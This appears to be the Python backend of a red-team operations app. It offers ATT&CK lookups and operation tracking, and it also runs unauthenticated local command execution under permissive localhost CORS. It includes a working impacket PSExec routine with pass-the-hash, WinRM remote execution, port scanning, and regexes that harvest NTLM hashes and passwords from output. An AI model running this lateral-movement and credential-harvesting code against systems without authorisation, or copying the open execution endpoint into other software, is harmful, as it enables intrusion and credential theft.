"""
RedForge Python Sidecar Engine
--------------------------------
Lightweight FastAPI server that the Tauri desktop app communicates with
for heavy operations (ATT&CK queries, recon, report generation, etc.).

Run standalone:
    uvicorn engine:app --reload --port 18765

The Tauri app will launch this as a sidecar process and discover the port.
"""

from __future__ import annotations

import os
from contextlib import asynccontextmanager
from typing import Any

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

import asyncio
import subprocess
import shlex
import os
import re
import shutil
import socket
from datetime import datetime, timezone

from database import (
    Operation,
    OperationCreate,
    OperationUpdate,
    TimelineEvent,
    TimelineEventCreate,
    Chain,
    ChainCreate,
    ChainWithSteps,
    Asset,
    Credential,
    close_db,
    get_data_dir,
    get_db,
)
from attack_data import (
    STORE,
    get_all_tactics,
    get_stats,
    get_technique,
    load_attack_data,
    search_techniques,
)

# --------------------------------------------------------------------------- #
# Lifespan / startup
# --------------------------------------------------------------------------- #

# File-based logging (essential for production debugging because the
# bundled sidecar's stdout is hidden by Tauri when launched as externalBin)
import logging
import logging.handlers


# ─── Ollama model auto-discovery ──────────────────────────────────────
# Users have different models. We want a sensible default that works
# with whatever they have, with an env-var override for power users.
_OLLAMA_MODEL_CACHE: str | None = None
_OLLAMA_LAST_CHECK: float = 0.0

# Preference order: smarter models first, then smaller fallbacks.
_OLLAMA_PREFERRED_MODELS = [
    "llama3.1:8b", "llama3:8b", "llama3.2:latest", "llama3.2:3b",
    "qwen2.5:14b", "qwen2.5:7b",
    "mistral:latest", "mistral:7b",
    "command-r:latest",
    "gemma2:9b", "gemma:7b", "gemma:2b",  # fallbacks for users with gemma
]


def get_ollama_model() -> str:
    """Return the best available Ollama model, cached for 60 seconds.

    Resolution order:
      1. $REDFORGE_OLLAMA_MODEL env var (explicit user override)
      2. First model from preferred list that the user actually has
      3. First model the user has installed at all
      4. Fallback string "llama3.1:8b" (will fail loudly if no Ollama)
    """
    global _OLLAMA_MODEL_CACHE, _OLLAMA_LAST_CHECK
    import time

    # Honor explicit override
    env_model = os.getenv("REDFORGE_OLLAMA_MODEL", "").strip()
    if env_model:
        return env_model

    # 60-second cache
    now = time.time()
    if _OLLAMA_MODEL_CACHE and (now - _OLLAMA_LAST_CHECK) < 60:
        return _OLLAMA_MODEL_CACHE

    try:
        import ollama
        resp = ollama.list()
        # Different ollama-python versions return slightly different shapes
        installed: list[str] = []
        # ollama-python pre-0.5 used dict with "name"; 0.5+ uses Model object
        # with "model" attribute. Handle both.
        models = resp.get("models") if isinstance(resp, dict) else getattr(resp, "models", [])
        for m in models or []:
            if isinstance(m, dict):
                name = m.get("model") or m.get("name")
            else:
                name = getattr(m, "model", None) or getattr(m, "name", None)
            if name:
                installed.append(name)

        # Pick first preferred model that is actually installed
        for pref in _OLLAMA_PREFERRED_MODELS:
            if pref in installed:
                _OLLAMA_MODEL_CACHE = pref
                _OLLAMA_LAST_CHECK = now
                logging.info(f"[ollama] Selected preferred model: {pref}")
                return pref

        # Otherwise use the first installed model
        if installed:
            _OLLAMA_MODEL_CACHE = installed[0]
            _OLLAMA_LAST_CHECK = now
            logging.info(f"[ollama] No preferred model installed, using: {installed[0]}")
            return installed[0]
    except Exception as e:
        logging.warning(f"[ollama] Could not list installed models: {e}")

    # Last resort
    return "llama3.1:8b"


def _setup_file_logging():
    """Set up rotating file logging in the data dir so users (and we)
    can see what the sidecar is doing in production."""
    try:
        data_dir = get_data_dir()
        data_dir.mkdir(parents=True, exist_ok=True)
        log_dir = data_dir / "logs"
        log_dir.mkdir(parents=True, exist_ok=True)
        log_file = log_dir / "sidecar.log"

        handler = logging.handlers.RotatingFileHandler(
            log_file, maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
        )
        fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s")
        handler.setFormatter(fmt)

        root = logging.getLogger()
        root.setLevel(logging.INFO)
        root.addHandler(handler)

        # Capture uvicorn access logs to the file too
        for name in ("uvicorn", "uvicorn.error", "uvicorn.access"):
            logger = logging.getLogger(name)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)

        logging.info(f"[RedForge Sidecar] File logging initialized: {log_file}")
        return log_file
    except Exception as e:
        print(f"[RedForge Sidecar] Could not set up file logging: {e}")
        return None


@asynccontextmanager
async def lifespan(app: FastAPI):
    log_file = _setup_file_logging()

    print("[RedForge Sidecar] Starting engine...")
    logging.info("[RedForge Sidecar] Starting engine...")

    data_dir = get_data_dir()
    print(f"[RedForge Sidecar] Data directory: {data_dir}")
    logging.info(f"[RedForge Sidecar] Data directory: {data_dir}")
    if log_file:
        print(f"[RedForge Sidecar] Log file: {log_file}")

    db = await get_db()
    print(f"[RedForge Sidecar] Database ready at: {db.db_path}")
    logging.info(f"[RedForge Sidecar] Database ready at: {db.db_path}")

    # Load ATT&CK data in the background so the sidecar becomes usable immediately
    asyncio.create_task(asyncio.to_thread(load_attack_data))

    yield

    await close_db()
    print("[RedForge Sidecar] Shutting down.")
    logging.info("[RedForge Sidecar] Shutting down.")


app = FastAPI(
    title="RedForge Sidecar",
    version="0.1.0",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url=None,
)

# CORS: Allow any local origin. Tauri's WebView2 uses different schemes per OS
# AND per Tauri version:
#   Windows (Tauri 2.x): http://tauri.localhost   <-- actual confirmed origin
#   macOS/Linux:          tauri://localhost
#   Dev mode:             http://localhost:1420
# Wildcards like "http://localhost:*" are NOT supported in allow_origins;
# we have to use allow_origin_regex. Safe because the sidecar only binds to 127.0.0.1.
app.add_middleware(
    CORSMiddleware,
    allow_origin_regex=(
        r"^(https?://(localhost|127\.0\.0\.1)(:\d+)?"
        r"|tauri://localhost"
        r"|https?://tauri\.localhost)$"   # both http AND https - Tauri 2 on Win uses http
    ),
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# --------------------------------------------------------------------------- #
# Models
# --------------------------------------------------------------------------- #

class HealthResponse(BaseModel):
    status: str
    version: str
    db_ready: bool = False
    attack_data_loaded: bool = False
    attack_data_stats: dict[str, Any] | None = None
    data_dir: str | None = None


class GreetRequest(BaseModel):
    name: str


class GreetResponse(BaseModel):
    message: str


# --------------------------------------------------------------------------- #
# Routes
# --------------------------------------------------------------------------- #

@app.get("/health", response_model=HealthResponse)
async def health() -> HealthResponse:
    """Basic health + readiness check used by the desktop app."""
    try:
        db = await get_db()
        db_ready = db.db_path.exists()
    except Exception:
        db_ready = False

    attack_loaded = STORE.is_ready()
    attack_stats = get_stats() if attack_loaded else None

    return HealthResponse(
        status="ok",
        version="0.1.0",
        db_ready=db_ready,
        attack_data_loaded=attack_loaded,
        attack_data_stats=attack_stats,
        data_dir=str(get_data_dir()),
    )


@app.post("/greet", response_model=GreetResponse)
async def greet(req: GreetRequest) -> GreetResponse:
    """Simple example RPC endpoint."""
    return GreetResponse(message=f"Sidecar says hello to {req.name}")


@app.get("/api/ollama/status")
async def ollama_status() -> dict[str, Any]:
    """Diagnose Ollama availability + which model would be used."""
    out: dict[str, Any] = {"ollama_installed": False, "ollama_running": False,
                           "selected_model": None, "available_models": [],
                           "tip": None}
    try:
        import ollama
        out["ollama_installed"] = True
    except ImportError:
        out["tip"] = "Ollama Python client not installed (this should be bundled - reinstall RedForge)."
        return out

    try:
        resp = ollama.list()
        out["ollama_running"] = True
        models_field = resp.get("models") if isinstance(resp, dict) else getattr(resp, "models", [])
        names: list[str] = []
        for m in models_field or []:
            if isinstance(m, dict):
                n = m.get("model") or m.get("name")
            else:
                n = getattr(m, "model", None) or getattr(m, "name", None)
            if n:
                names.append(n)
        out["available_models"] = names

        if not names:
            out["tip"] = "Ollama is running but no models are installed. Run: ollama pull llama3.1:8b"
        else:
            out["selected_model"] = get_ollama_model()
            if not any(out["selected_model"] in n for n in names):
                out["tip"] = f"Selected model '{out['selected_model']}' not in installed list."
    except Exception as e:
        out["tip"] = f"Ollama is installed but not running ({e}). Start it: 'ollama serve' or launch the Ollama app."

    return out


@app.get("/attack/version")
async def attack_version() -> dict[str, Any]:
    """Placeholder until real ATT&CK data is loaded."""
    return {
        "status": "not_loaded",
        "message": "ATT&CK Enterprise data will be bundled/loaded in Phase 1",
    }


# --------------------------------------------------------------------------- #
# Operations API (Phase 1)
# --------------------------------------------------------------------------- #

@app.get("/api/operations", response_model=list[Operation])
async def list_operations():
    db = await get_db()
    return await db.list_operations()


@app.post("/api/operations", response_model=Operation, status_code=201)
async def create_operation(payload: OperationCreate):
    db = await get_db()
    return await db.create_operation(payload)


@app.get("/api/operations/{op_id}", response_model=Operation)
async def get_operation(op_id: str):
    db = await get_db()
    op = await db.get_operation(op_id)
    if not op:
        raise HTTPException(status_code=404, detail="Operation not found")
    return op


@app.patch("/api/operations/{op_id}", response_model=Operation)
async def update_operation(op_id: str, payload: OperationUpdate):
    db = await get_db()
    op = await db.update_operation(op_id, payload)
    if not op:
        raise HTTPException(status_code=404, detail="Operation not found")
    return op


@app.delete("/api/operations/{op_id}", status_code=204)
async def delete_operation(op_id: str):
    db = await get_db()
    deleted = await db.delete_operation(op_id)
    if not deleted:
        raise HTTPException(status_code=404, detail="Operation not found")
    return None


# --------------------------------------------------------------------------- #
# ATT&CK API (Phase 1 - basic but very useful)
# --------------------------------------------------------------------------- #

@app.get("/api/attack/stats")
async def attack_stats():
    return get_stats()


@app.get("/api/attack/tactics")
async def attack_tactics():
    return get_all_tactics()


@app.get("/api/attack/techniques")
async def attack_techniques(
    q: str | None = None,
    tactic: str | None = None,
    platform: str | None = None,
    limit: int = 150,
):
    """Basic search + filter for the browser."""
    results = search_techniques(query=q, tactic=tactic, platform=platform, limit=limit)
    return {
        "count": len(results),
        "techniques": results,
    }


@app.get("/api/attack/techniques/{external_id}")
async def attack_technique_detail(external_id: str):
    tech = get_technique(external_id)
    if not tech:
        raise HTTPException(status_code=404, detail="Technique not found")
    return tech


# --------------------------------------------------------------------------- #
# Timeline / Execution Log API
# --------------------------------------------------------------------------- #

@app.get("/api/operations/{op_id}/timeline", response_model=list[TimelineEvent])
async def get_operation_timeline(op_id: str):
    db = await get_db()
    return await db.get_timeline_for_operation(op_id)


@app.post("/api/operations/{op_id}/timeline", response_model=TimelineEvent, status_code=201)
async def log_timeline_event(op_id: str, payload: TimelineEventCreate):
    # Ensure the operation_id in payload matches the URL
    payload.operation_id = op_id
    db = await get_db()
    return await db.log_timeline_event(payload)


# --------------------------------------------------------------------------- #
# Attack Chain Builder API (Phase 2 - the heart of the app)
# --------------------------------------------------------------------------- #

@app.post("/api/operations/{op_id}/chains", response_model=Chain, status_code=201)
async def create_chain(op_id: str, payload: ChainCreate):
    payload.operation_id = op_id
    db = await get_db()
    return await db.create_chain(payload)

@app.get("/api/operations/{op_id}/chains", response_model=list[Chain])
async def list_chains(op_id: str):
    db = await get_db()
    return await db.get_chains_for_operation(op_id)

@app.get("/api/chains/{chain_id}", response_model=ChainWithSteps)
async def get_chain(chain_id: str):
    db = await get_db()
    chain = await db.get_chain_with_steps(chain_id)
    if not chain:
        raise HTTPException(status_code=404, detail="Chain not found")
    return chain

@app.post("/api/chains/{chain_id}/steps")
async def add_step_to_chain(chain_id: str, technique_id: str):
    db = await get_db()
    await db.add_step_to_chain(chain_id, technique_id)
    return await db.get_chain_with_steps(chain_id)

@app.patch("/api/steps/{step_id}")
async def update_chain_step(step_id: str, status: str, notes: str | None = None):
    db = await get_db()
    await db.update_step_status(step_id, status, notes)
    return {"success": True}

@app.delete("/api/chains/{chain_id}", status_code=204)
async def delete_chain(chain_id: str):
    db = await get_db()
    await db.delete_chain(chain_id)
    return None


# --------------------------------------------------------------------------- #
# Real Execution (Practical Functionality) - Local + Remote
# --------------------------------------------------------------------------- #

class ExecuteRequest(BaseModel):
    command: str
    operation_id: str | None = None
    technique_id: str | None = None
    notes: str | None = None

class RemoteExecuteRequest(BaseModel):
    host: str
    command: str
    username: str
    password: str | None = None
    hash: str | None = None          # For pass-the-hash (NTLM hash)
    domain: str = ""
    execution_method: str = "winrm"  # winrm | psexec
    port: int | None = None          # Optional: 5985/5986 for WinRM, ignored for PSExec
    operation_id: str | None = None
    technique_id: str | None = None
    notes: str | None = None

class ExecuteResponse(BaseModel):
    success: bool
    exit_code: int | None = None
    stdout: str
    stderr: str
    duration_ms: int
    logged: bool = False
    method: str = "local"
    extracted_assets: int = 0
    extracted_creds: int = 0

@app.post("/api/execute", response_model=ExecuteResponse)
async def execute_command(req: ExecuteRequest):
    """
    Execute a command locally and optionally log the result.
    """
    start = datetime.now(timezone.utc)
    
    try:
        if os.name == 'nt':
            result = subprocess.run(
                req.command, shell=True, capture_output=True, text=True,
                timeout=300, encoding='utf-8', errors='replace'
            )
        else:
            result = subprocess.run(
                shlex.split(req.command), shell=False, capture_output=True, text=True,
                timeout=300, encoding='utf-8', errors='replace'
            )
        
        end = datetime.now(timezone.utc)
        duration = int((end - start).total_seconds() * 1000)
        
        stdout = (result.stdout or "")[:8000]
        stderr = (result.stderr or "")[:4000]
        exit_code = result.returncode
        success = exit_code == 0

        logged = False
        extracted = {"assets": 0, "creds": 0}
        if req.operation_id:
            db = await get_db()
            await db.log_timeline_event(TimelineEventCreate(
                operation_id=req.operation_id,
                type="execution",
                technique_id=req.technique_id,
                command=req.command,
                output=stdout,
                result="success" if success else "fail",
                notes=req.notes or f"Exit code: {exit_code}",
                execution_method="local"
            ))
            logged = True

            # === AUTOMATIC ASSET / CRED EXTRACTION (Next Phase) ===
            try:
                extracted = await _auto_extract_and_persist(
                    req.operation_id, stdout, stderr, req.command, None
                )
            except Exception as ex:
                print(f"[extract] local execution extract failed: {ex}")

        return ExecuteResponse(
            success=success, exit_code=exit_code, stdout=stdout, stderr=stderr,
            duration_ms=duration, logged=logged, method="local",
            extracted_assets=extracted.get("assets", 0),
            extracted_creds=extracted.get("creds", 0),
        )
        
    except subprocess.TimeoutExpired:
        return ExecuteResponse(success=False, exit_code=None, stdout="", stderr="Timed out", duration_ms=300000, logged=False, method="local", extracted_assets=0, extracted_creds=0)
    except Exception as e:
        return ExecuteResponse(success=False, exit_code=None, stdout="", stderr=str(e), duration_ms=0, logged=False, method="local", extracted_assets=0, extracted_creds=0)


# ---------------- Remote Execution (WinRM + Full PSExec) ---------------- #

async def _execute_psexec(host: str, username: str, password: str | None, ntlm_hash: str | None, domain: str, command: str) -> tuple[str, str, int | None]:
    """
    Full working PSExec using impacket (classic red team technique).
    Writes output to ADMIN$\\Temp and retrieves it.
    Supports pass-the-hash.
    """
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, scmr
    import uuid
    import time

    stdout = ""
    stderr = ""
    exit_code = None

    smb = None
    dce = None

    try:
        # Handle pass-the-hash
        if ntlm_hash:
            if ':' in ntlm_hash:
                lm_hash, nt_hash = ntlm_hash.split(':', 1)
            else:
                lm_hash = 'aad3b435b51404eeaad3b435b51404ee'
                nt_hash = ntlm_hash
        else:
            lm_hash = ''
            nt_hash = ''

        # 1. Connect via SMB
        smb = SMBConnection(host, host)
        smb.login(username, password or '', domain, lm_hash, nt_hash)

        # 2. Connect to Service Control Manager
        rpctransport = transport.SMBTransport(
            remoteName=host,
            dstip=host,
            filename=r'\svcctl',
            smb_connection=smb
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        # 3. Open SCM
        ans = scmr.hROpenSCManagerW(dce)
        scManagerHandle = ans['lpScHandle']

        # 4. Create a unique service name
        service_name = f"RedForge_{uuid.uuid4().hex[:10]}"
        output_filename = f"{service_name}.out"

        # Command that redirects output to ADMIN$ share (very reliable)
        full_command = f'%COMSPEC% /Q /c {command} > C:\\Windows\\Temp\\{output_filename} 2>&1 & exit'

        # 5. Create the service (we need the actual service handle for reliable cleanup)
        resp = scmr.hRCreateServiceW(
            dce,
            scManagerHandle,
            service_name,
            service_name,
            lpBinaryPathName=full_command,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service_handle = resp.get('lpServiceHandle') or scManagerHandle

        # 6. Start the service (this executes the command)
        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception:
            pass  # Many expected error codes (service already running, etc.)

        # 7. Poll for output file (much more reliable than fixed sleep)
        tid = None
        output_data = None
        for _ in range(12):  # up to ~18-24 seconds
            time.sleep(1.5)
            try:
                tid = smb.connectTree('ADMIN$')
                fid = smb.openFile(tid, f'Temp\\{output_filename}', desiredAccess=0x120089)
                output_data = smb.readFile(tid, fid, 0, -1)
                smb.closeFile(tid, fid)
                if output_data:
                    stdout = output_data.decode('utf-8', errors='replace')
                    break
            except Exception:
                pass  # file not there yet

        if not stdout and not output_data:
            stderr = (stderr or "") + " (no output file appeared after waiting)"

        # 8. Cleanup the service (best effort, multiple strategies)
        for handle in [service_handle, scManagerHandle]:
            try:
                scmr.hRDeleteService(dce, handle)
            except Exception:
                pass

        exit_code = 0 if stdout else 1
        return stdout, stderr, exit_code

    except Exception as e:
        return stdout, f"PSExec error: {str(e)}", None

    finally:
        try:
            if dce:
                dce.disconnect()
        except:
            pass
        try:
            if smb:
                smb.logoff()
        except:
            pass


@app.post("/api/remote/execute", response_model=ExecuteResponse)
async def remote_execute(req: RemoteExecuteRequest):
    """
    Execute commands on remote Windows targets.
    Supports WinRM (native) and basic PSExec via impacket.
    """
    start = datetime.now(timezone.utc)
    method = req.execution_method.lower()
    stdout = ""
    stderr = ""
    exit_code = None
    success = False

    try:
        if method == "winrm":
            # WinRM using pywinrm — supports custom port + https for 5986
            import winrm
            port = req.port or 5985
            scheme = "https" if port == 5986 else "http"
            url = f"{scheme}://{req.host}:{port}/wsman"

            # Note: Full pass-the-hash on WinRM is limited in pywinrm without CredSSP.
            # We still try; PTH works best with PSExec path for now.
            session = winrm.Session(
                url,
                auth=(req.username, req.password or ""),
                transport='ntlm'
            )
            result = session.run_cmd(req.command)
            stdout = result.std_out.decode('utf-8', errors='replace') if result.std_out else ""
            stderr = result.std_err.decode('utf-8', errors='replace') if result.std_err else ""
            exit_code = result.status_code
            success = exit_code == 0

        elif method == "psexec":
            # ==================== FULL WORKING PSEXEC ====================
            stdout, stderr, exit_code = await _execute_psexec(
                host=req.host,
                username=req.username,
                password=req.password,
                ntlm_hash=req.hash,
                domain=req.domain,
                command=req.command
            )
            success = (exit_code == 0) if exit_code is not None else False

        else:
            raise ValueError(f"Unknown execution method: {method}")

    except Exception as e:
        stderr = f"Remote execution error: {str(e)}"
        success = False

    end = datetime.now(timezone.utc)
    duration = int((end - start).total_seconds() * 1000)

    logged = False
    extracted = {"assets": 0, "creds": 0}
    if req.operation_id:
        db = await get_db()
        await db.log_timeline_event(TimelineEventCreate(
            operation_id=req.operation_id,
            type="execution",
            technique_id=req.technique_id or ("T1021.006" if method == "winrm" else "T1021.002"),
            command=req.command,
            output=stdout[:6000],
            result="success" if success else "fail",
            notes=req.notes or f"Remote execution on {req.host} as {req.username}",
            target_host=req.host,
            execution_method=method,
            remote_user=f"{req.domain}\\{req.username}" if req.domain else req.username,
            metadata={"stderr": stderr[:2000]}
        ))
        logged = True

        # === AUTOMATIC ASSET / CRED EXTRACTION (Next Phase) ===
        try:
            extracted = await _auto_extract_and_persist(
                req.operation_id, stdout, stderr, req.command, req.host
            )
        except Exception as ex:
            print(f"[extract] remote execution extract failed: {ex}")

    return ExecuteResponse(
        success=success,
        exit_code=exit_code,
        stdout=stdout,
        stderr=stderr,
        duration_ms=duration,
        logged=logged,
        method=method,
        extracted_assets=extracted.get("assets", 0),
        extracted_creds=extracted.get("creds", 0),
    )


# --------------------------------------------------------------------------- #
# Remote Access Test / Verify (new "more remote" capability)
# Safe, lightweight diagnostic to check if you actually have access before
# running heavier commands. Very useful for students.
# --------------------------------------------------------------------------- #

class RemoteTestRequest(BaseModel):
    host: str
    username: str
    password: str | None = None
    hash: str | None = None
    domain: str = ""
    execution_method: str = "winrm"
    port: int | None = None
    operation_id: str | None = None

class RemoteTestResponse(BaseModel):
    success: bool
    method: str
    host: str
    user: str | None = None
    hostname: str | None = None
    os_info: str | None = None
    domain_info: str | None = None
    raw_output: str
    stderr: str = ""
    duration_ms: int
    extracted_assets: int = 0
    extracted_creds: int = 0
    tips: list[str] = []

@app.post("/api/remote/test", response_model=RemoteTestResponse)
async def remote_test(req: RemoteTestRequest):
    """Lightweight access verification. Runs safe diagnostic commands only."""
    start = datetime.now(timezone.utc)
    method = req.execution_method.lower()
    stdout = ""
    stderr = ""
    tips: list[str] = []

    # Safe diagnostic command per method
    if method == "winrm":
        # PowerShell one-liner for rich info
        diag_cmd = (
            "powershell -NoProfile -Command \""
            "$u=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name; "
            "$h=$env:COMPUTERNAME; "
            "$d=$env:USERDOMAIN; "
            "$o=(Get-WmiObject Win32_OperatingSystem).Caption; "
            "Write-Output ('USER:' + $u); "
            "Write-Output ('HOST:' + $h); "
            "Write-Output ('DOMAIN:' + $d); "
            "Write-Output ('OS:' + $o)\""
        )
    else:
        # CMD for PSExec path (more universal)
        diag_cmd = "whoami /all & hostname & echo DOMAIN=%USERDOMAIN% & ver"

    try:
        if method == "winrm":
            import winrm
            port = req.port or 5985
            scheme = "https" if port == 5986 else "http"
            url = f"{scheme}://{req.host}:{port}/wsman"
            session = winrm.Session(url, auth=(req.username, req.password or ""), transport='ntlm')
            result = session.run_cmd(diag_cmd)
            stdout = result.std_out.decode('utf-8', errors='replace') if result.std_out else ""
            stderr = result.std_err.decode('utf-8', errors='replace') if result.std_err else ""
        else:
            stdout, stderr, _ = await _execute_psexec(
                host=req.host, username=req.username, password=req.password,
                ntlm_hash=req.hash, domain=req.domain, command=diag_cmd
            )
    except Exception as e:
        stderr = f"Test failed: {str(e)}"
        tips.append("Check that the target is reachable, the port is open, and credentials are correct.")

    # Parse common fields for nice UI
    user = None
    hostname = None
    os_info = None
    domain_info = None

    for line in (stdout + "\n" + stderr).splitlines():
        line = line.strip()
        if line.upper().startswith("USER:"):
            user = line.split(":", 1)[1].strip()
        elif line.upper().startswith("HOST:"):
            hostname = line.split(":", 1)[1].strip()
        elif line.upper().startswith("OS:"):
            os_info = line.split(":", 1)[1].strip()
        elif "DOMAIN=" in line.upper():
            domain_info = line.split("=", 1)[1].strip()
        elif line.upper().startswith("DOMAIN:"):
            domain_info = line.split(":", 1)[1].strip()

    if not user and "whoami" in stdout.lower():
        # fallback simple parse
        for line in stdout.splitlines():
            if "\\" in line and not user:
                user = line.strip()

    # Educational tips based on results
    if "access is denied" in (stderr + stdout).lower():
        tips.append("Access denied — try a different user, pass-the-hash, or local admin context.")
    if "winrm" in stderr.lower() and method == "winrm":
        tips.append("WinRM may not be enabled or reachable. Try PSExec over 445 instead, or enable WinRM on target.")
    if "connection refused" in stderr.lower() or "timed out" in stderr.lower():
        tips.append("Connection failed. Verify firewall rules and that the chosen port (445 for PSExec, 5985/5986 for WinRM) is open.")

    duration = int((datetime.now(timezone.utc) - start).total_seconds() * 1000)

    extracted = {"assets": 0, "creds": 0}
    if req.operation_id and (stdout or stderr):
        try:
            extracted = await _auto_extract_and_persist(
                req.operation_id, stdout, stderr, f"[remote-test] {diag_cmd[:40]}", req.host
            )
        except Exception:
            pass

    return RemoteTestResponse(
        success=bool(stdout and not stderr.strip().startswith("Test failed")),
        method=method,
        host=req.host,
        user=user,
        hostname=hostname,
        os_info=os_info,
        domain_info=domain_info,
        raw_output=stdout or stderr,
        stderr=stderr,
        duration_ms=duration,
        extracted_assets=extracted.get("assets", 0),
        extracted_creds=extracted.get("creds", 0),
        tips=tips,
    )


# --------------------------------------------------------------------------- #
# Basic Recon (Practical)
# --------------------------------------------------------------------------- #

class ReconRequest(BaseModel):
    target: str
    ports: str = "22,80,443,445,3389,5985"  # Common red team ports
    operation_id: str | None = None

@app.post("/api/recon/scan")
async def basic_recon_scan(req: ReconRequest):
    """Very basic TCP connect scan. For authorized testing only."""
    open_ports = []
    try:
        targets = [req.target.strip()]
        port_list = [int(p.strip()) for p in req.ports.split(",") if p.strip().isdigit()]

        for target in targets:
            for port in port_list:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.5)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        open_ports.append({"host": target, "port": port, "status": "open"})
                    sock.close()
                except Exception:
                    pass

        # Convert to new parser shape and auto-persist via bulk helper
        parsed_for_assets = [
            {"host": p["host"], "port": p["port"], "protocol": "tcp", "service": "", "status": "open", "source": "basic"}
            for p in open_ports
        ]
        saved = 0
        if req.operation_id and parsed_for_assets:
            saved = await _bulk_upsert_assets(req.operation_id, parsed_for_assets)

        # Log
        if req.operation_id and open_ports:
            db = await get_db()
            await db.log_timeline_event(TimelineEventCreate(
                operation_id=req.operation_id,
                type="recon",
                notes=f"Scanned {req.target} → found {len(open_ports)} open ports (saved {saved})",
                metadata={"open_ports": open_ports}
            ))

        return {
            "target": req.target,
            "open_ports": open_ports,
            "scanned_ports": port_list,
            "saved_to_assets": saved,
        }
    except Exception as e:
        return {"error": str(e), "open_ports": []}


# --------------------------------------------------------------------------- #
# Enhanced Recon: Real tools + Paste parsing + Auto Asset Ingestion
# --------------------------------------------------------------------------- #

class ReconExecuteRequest(BaseModel):
    target: str
    ports: str = "22,80,443,445,3389,5985,8080"
    operation_id: str | None = None
    tool: str = "python"   # "python" | "nmap" | "masscan"


@app.post("/api/recon/execute")
async def recon_execute(req: ReconExecuteRequest):
    """
    Smart recon entrypoint.
    - tool=python: fast built-in TCP connect scan (no external deps)
    - tool=nmap: uses local nmap if present (best results)
    - tool=masscan: uses masscan if present (very fast for large ranges)
    Always returns structured results + auto-persists assets when operation_id given.
    """
    parsed_assets: list[dict] = []
    used_tool = req.tool

    if req.tool == "nmap" and shutil.which("nmap"):
        try:
            port_arg = req.ports.replace(" ", "")
            cmd = [
                "nmap", "-Pn", "-sS", "--open", "-T4", "-p", port_arg,
                req.target, "-oG", "-"
            ]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=180)
            output = stdout.decode(errors="ignore")
            parsed_assets = _parse_scan_output(output)
            used_tool = "nmap"
        except Exception as ex:
            print(f"[recon] nmap failed, falling back: {ex}")
            # fall through to python

    if req.tool == "masscan" and shutil.which("masscan"):
        try:
            # masscan needs root for SYN usually; we do a safe TCP-ish or let user handle
            cmd = ["masscan", req.target, "-p", req.ports, "--rate", "1000", "-oL", "-"]
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
            parsed_assets = _parse_scan_output(stdout.decode(errors="ignore"))
            used_tool = "masscan"
        except Exception as ex:
            print(f"[recon] masscan failed: {ex}")

    if not parsed_assets:
        # Fallback: pure Python socket scan (always works)
        used_tool = "python"
        try:
            targets = [t.strip() for t in req.target.split(",") if t.strip()]
            port_list = [int(p.strip()) for p in req.ports.split(",") if p.strip().isdigit()]
            for t in targets:
                for p in port_list[:80]:  # safety cap
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.8)
                        if sock.connect_ex((t, p)) == 0:
                            parsed_assets.append({
                                "host": t, "port": p, "protocol": "tcp",
                                "service": "", "status": "open", "source": "python"
                            })
                        sock.close()
                    except Exception:
                        pass
        except Exception as e:
            return {"error": str(e), "assets": [], "tool": used_tool}

    # Dedup one more time
    deduped = []
    seen = set()
    for a in parsed_assets:
        k = (a["host"], a["port"])
        if k not in seen:
            seen.add(k)
            deduped.append(a)

    saved = 0
    if req.operation_id:
        saved = await _bulk_upsert_assets(req.operation_id, deduped)

    return {
        "target": req.target,
        "tool": used_tool,
        "assets": deduped,
        "count": len(deduped),
        "saved_to_assets": saved,
    }


class ReconParseRequest(BaseModel):
    operation_id: str | None = None
    raw_output: str
    source_hint: str | None = None


@app.post("/api/recon/parse")
async def recon_parse(req: ReconParseRequest):
    """Parse arbitrary pasted recon output (nmap, masscan, etc) and optionally auto-save as assets."""
    parsed = _parse_scan_output(req.raw_output)
    saved = 0
    if req.operation_id and parsed:
        saved = await _bulk_upsert_assets(req.operation_id, parsed)
    return {
        "count": len(parsed),
        "saved": saved,
        "assets": parsed[:200],  # cap for response size
    }


# --------------------------------------------------------------------------- #
# Bulk Assets API (critical for recon auto-ingest)
# --------------------------------------------------------------------------- #

class BulkAssetItem(BaseModel):
    host: str
    port: int | None = None
    service: str | None = None
    protocol: str | None = "tcp"
    status: str | None = "open"
    notes: str | None = None
    metadata: dict | None = None


@app.post("/api/operations/{op_id}/assets/bulk")
async def bulk_create_assets(op_id: str, items: list[BulkAssetItem]):
    db = await get_db()
    saved = 0
    for item in items:
        try:
            await db.upsert_asset(
                operation_id=op_id,
                host=item.host,
                port=item.port,
                service=item.service,
                protocol=item.protocol,
                status=item.status,
                notes=item.notes,
                metadata=item.metadata or {}
            )
            saved += 1
        except Exception:
            pass
    # Bump not possible here; frontend will call bumpAssetUpdate()
    return {"saved": saved, "total": len(items)}


# --------------------------------------------------------------------------- #
# Automatic Post-Execution Asset & Credential Extraction (the "next phase")
# This closes the loop: every command you run can discover new things.
# --------------------------------------------------------------------------- #

CRED_HASH_RE = re.compile(
    r'([A-Za-z0-9_.$@-]+)[:\s]+(?:\d+:)?([a-f0-9]{32}):([a-f0-9]{32})', re.IGNORECASE
)  # Classic pwdump / secretsdump NTLM
CRED_USERPASS_RE = re.compile(
    r'([A-Za-z0-9_.$@-]{2,})\s*[:=]\s*([^\s:;]{3,})', re.IGNORECASE
)
